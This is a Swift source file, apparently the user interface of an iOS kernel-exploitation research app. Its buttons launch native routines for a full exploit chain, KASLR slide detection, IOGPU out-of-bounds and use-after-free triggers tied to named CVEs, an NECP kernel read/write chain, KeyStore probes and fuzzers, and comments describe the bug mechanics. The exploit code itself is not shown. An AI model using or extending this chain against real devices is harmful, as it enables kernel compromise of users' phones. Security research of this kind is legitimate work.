import SwiftUI
import Combine
import UIKit

enum RunStatus {
    case idle, running, ok, fail

    var color: Color {
        switch self {
        case .idle:    return .secondary
        case .running: return .yellow
        case .ok:      return .green
        case .fail:    return .red
        }
    }

    var label: String {
        switch self {
        case .idle:    return "IDLE"
        case .running: return "RUNNING"
        case .ok:      return "OK"
        case .fail:    return "FAIL"
        }
    }
}

func nkLogBridge(_ cstr: UnsafePointer<CChar>?) {
    guard let cstr = cstr else { return }
    let line = String(cString: cstr)

    nk_async_main {
        AppState.shared.append(line)
    }
}

final class AppState: ObservableObject {
    static let shared = AppState()

    @Published var log: String = ""
    @Published var slide: UInt64 = 0
    @Published var base: UInt64 = 0
    @Published var running: Bool = false
    private var starting = false
    @Published var status: RunStatus = .idle

    @Published var lang: String = UserDefaults.standard.string(forKey: "lang") ?? "ru" {
        didSet { UserDefaults.standard.set(lang, forKey: "lang") }
    }

    private var lines: [String] = []
    private let maxLines = 400

    func t(_ en: String, _ ru: String) -> String {
        return lang == "ru" ? ru : en
    }

    func append(_ line: String) {
        let verbose = UserDefaults.standard.object(forKey: "verbose") as? Bool ?? true

        if !verbose && line.hasPrefix("[KASLR] ptr") { return }

        lines.append(line)

        if lines.count > maxLines {
            lines.removeFirst(lines.count - maxLines)
        }

        log = lines.joined(separator: "\n")
    }

    func clear() {
        lines.removeAll()
        log = ""
    }

    func run() {
        start { return nk_full_exploit() == 0 }
    }

    func slideOnly() {
        start { return nk_detect_slide() == 0 }
    }

    /* CVE-2025-24257 — deliberately tiny: one open + one call. */
    func iogpuOob() {
        start {
            nk_iogpu_oob_run()
            return true
        }
    }

    /* Row-dispatch + structured-path probe over IOGPU types 1..33. */
    func iogpuProbe2() {
        start {
            nk_iogpu_probe2_run()
            return true
        }
    }

    /* CVE-2025-24257 corrected path: IOGPUFamily sel 64 (group creator),
       type 1 — reachable from a plain sandbox, no WebKit pivot needed. */
    func iogpuOob64() {
        start {
            nk_iogpu_oob64_run()
            return true
        }
    }

    /* IOGPU group-growth OOB probe: create resource -> create group ->
       add resource, which drives the UNCHECKED capacity path
       (capacity = 2*count, no lower bound) -> obj+40 = 0xffffffff.
       Durable log: Documents/group_oob.log */
    func groupOob(_ trigger: Bool) {
        start {
            nk_iogpu_group_oob_run(trigger ? 1 : 0)
            return true
        }
    }

    /* cmd=64 underflow trigger: a group with capacity 1, then the insert
       whose bucket degenerates into the full hash. Durable log:
       Documents/group_oob.log */
    func groupOob64() {
        start {
            nk_iogpu_group_oob_run(2)
            return true
        }
    }

    /* Remove-path trigger: the slot table mask is decremented on every
       removal, so a removal after a capacity-64 group turns the mask into
       0xffffffff and the next insert walks out of the bitmap.
       Durable log: Documents/group_oob.log */
    func groupOobRemove() {
        start {
            nk_iogpu_group_oob_run(3)
            return true
        }
    }

    /* Duplicate-add trigger: adding the same resource twice forces the
       removal that decrements the slot table mask. Durable log:
       Documents/group_oob.log */
    func groupOobDup() {
        start {
            nk_iogpu_group_oob_run(5)
            return true
        }
    }

    /* Controlled OOB write: duplicate insert with the index steered by the
       IOSurface geometry. Durable log: Documents/group_oob.log */
    func groupOobSteer() {
        start {
            nk_iogpu_group_oob_run(6)
            return true
        }
    }

    /* Kernel self-read: the app process has the kernel mapped at
       0xfffffff0_... + slide, so a plain memcpy reads the kernel's data
       segment. No bug needed. Durable log: Documents/group_oob.log */
    func kernelSelfRead() {
        start {
            nk_iogpu_group_oob_run(8)
            return true
        }
    }

    /* Kernel read-out probe: point the IOGPU copy-out at a buffer we own
       and see what the kernel writes into it. Durable log:
       Documents/group_oob.log */
    func groupOobRead() {
        start {
            nk_iogpu_group_oob_run(7)
            return true
        }
    }

    /* Turn a leaked kernel pointer into a mapping: IOMemoryDescriptor
       GetAddress on it gives a userspace view of kernel memory. */
    func kernMap() {
        start {
            nk_kern_map_try()
            return true
        }
    }

    /* Kernel leak hunt: find a user client that returns a kernel address.
       Durable log: Documents/kern_leak.log */
    func kernLeakHunt() {
        start {
            nk_kernel_leak_hunt()
            return true
        }
    }

    /* NECP data-only chain: the only kernel read/write channel on 23.55.
       Durable log: Documents/necp_chain.log */
    func necpChain() {
        start {
            nk_dataonly_necp_chain()
            return true
        }
    }

    /* Capacity matrix: which struct field is the real capacity and what
       gates it. Durable log: Documents/cap_matrix.log */
    func capMatrix() {
        start {
            nk_iogpu_capacity_matrix()
            return true
        }
    }

    /* OOB hunt — systematic struct-input fuzz over every reachable user
       client, with a durable log line before every call so the last line
       names the call that panicked the kernel. */
    func oobHunt() {
        start {
            nk_oob_hunt_run()
            return true
        }
    }

    /* AIO kevent UAF (Track B / B12) — standalone runner.
       Durable log: Documents/aio_uaf.log */
    func aioUaf() {
        start {
            _ = nk_aio_uaf_run(300)
            return true
        }
    }

    /* CVE-2026-64788 IOGPU UAF PoC — Metal/IOSurface driven, Documents-logged. */
    func iogpuUaf() {
        start {
            nk_iogpu_uaf_run()
            return true
        }
    }

    /* Fuzz batch: surface hunts only, no KASLR stage, no gated primitives. */
    func fuzzBatch() {
        start {
            nk_fuzz_batch()
            return true
        }
    }

    /* Fuzz v2: kernel-VA forensics + 18-family open/sweep map. */
    /* Chain: pivot completes FIRST; then IOGPU OOB 24257 -> KeyStore.
       Race lane removed per dj. A press before the pivot finishes only
       queues the request — the gate event fires it. */
    func chain() {
        start {
            if NKBridge.autoChainFired {
                nk_jsbridge_log("GEN", "manual chain pressed - ignored, chain already scheduled/ran")
            } else if NKBridge.pivotDone {
                NKBridge.autoChainFired = true
                nk_jsbridge_log("GEN", "manual chain pressed (button, pivot done) — running now")
                nk_chain_run()
            } else {
                NKBridge.chainPending = true
                nk_jsbridge_log("GEN", "manual chain pressed - queued until pivot RECON COMPLETE")
            }
            return true
        }
    }

    /* Race harness: same-UC concurrent dispatch on KeyStore + AGX. */
    func racer() {
        start {
            nk_racer_run()
            return true
        }
    }

    func fuzz2() {
        start {
            nk_fuzz2_run()
            return true
        }
    }

    /* KeyStore UC s17/s35 content-gate magic probe. */
    func ksmagic() {
        start {
            nk_ksmagic_run()
            return true
        }
    }

    /* No-WebKit kernel-surface scan: IOSurface matrix + HID/FB/accessory family opens. */
    func surfaceScan() {
        start {
            nk_surface_scan_run()
            return true
        }
    }

    /* IOMobileFramebuffer deep sweep: types 0..15 x scalar AND structured 24..127. */
    func iomfbDeep() {
        start {
            nk_iomfb_deep_run()
            return true
        }
    }

    /* IOMFB v2 shape profiler: live-pool sels x arity/structure-size fingerprint. */
    func iomfbV2() {
        start {
            nk_iomfb_v2_run()
            return true
        }
    }

    /* IOMFB v3 gate hunter: sels 0..92 fingerprint with sentinel flip detection. */
    func iomfbV3() {
        start {
            nk_iomfb_v3_run()
            return true
        }
    }

    func respring() {
        append("[respring] uid=\(geteuid())")
        append("[respring] needs root + frontboard entitlements, skipped on stock iOS")
    }

    private func start(_ work: @escaping () -> Bool) {
        /* The guard must be SYNCHRONOUS. `running` is set from nk_async_main, so
           a second tap in that window slipped through and two probe instances
           (TRIGGER + READ-ONLY) ran concurrently, racing on shared state. */
        guard !running, !starting else { return }
        starting = true
        /* `starting` is cleared when the work finishes, not when start()
           returns - a defer here released it immediately and let three
           probe sessions run at once. It is reset in the completion block
           below. */

        nk_set_log(nkLogBridge)
        nk_set_probe_done { probeId, verdict in
            nk_async_main {
                AppState.shared.append(String(format: "[RUNNER] probe=%d verdict=%d", probeId, verdict))
            }
        }

        nk_async_main {
            self.running = true
            self.status = .running
            self.lines.removeAll()
            self.log = ""
            self.slide = 0
            self.base = 0
        }

        nk_async_background {
            let ok = work()
            let s = g_nk.slide
            let b = g_nk.base
            let root = g_nk.has_root

            nk_async_main {
                self.starting = false
                self.slide = s
                self.base = b
                self.running = false
                self.status = (ok || root != 0) ? .ok : .fail
            }
        }
    }

    /* Protocol Phase-1 decision point: widened SCAL grid (8320 calls). */
    func iogpuScal() {
        start {
            nk_iogpu_scal_run()
            return true
        }
    }
}